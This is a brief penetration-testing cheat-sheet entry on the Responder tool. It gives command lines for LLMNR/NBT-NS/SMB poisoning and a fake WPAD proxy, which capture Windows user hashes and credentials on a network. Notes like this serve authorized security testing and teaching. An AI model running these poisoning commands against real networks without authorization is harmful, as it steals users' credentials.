Responder responds to broadcast or targeted queries for many types of servers with positive results and prompts authentication from Windows domains, allowing us to gain user hashes and potentially credentials from the network. Syntaxes below. 

```shell
responder -I <interface> -A # Passive; do not respond, only listen

responder -I <interface> -v # Poisons all protocols (LLMNR, HTTP, SMB, NBT-NS, etc...)

responder -I eth0 -wrf 
# -w: Start the WPAD proxy (Fake that you are a proxy to Windows browser)
# -r: Enable answers for netbios wredir suffix queries.
# -f: Fingerprint remote host and operating system
```

Output saved to: /usr/share/responder/logs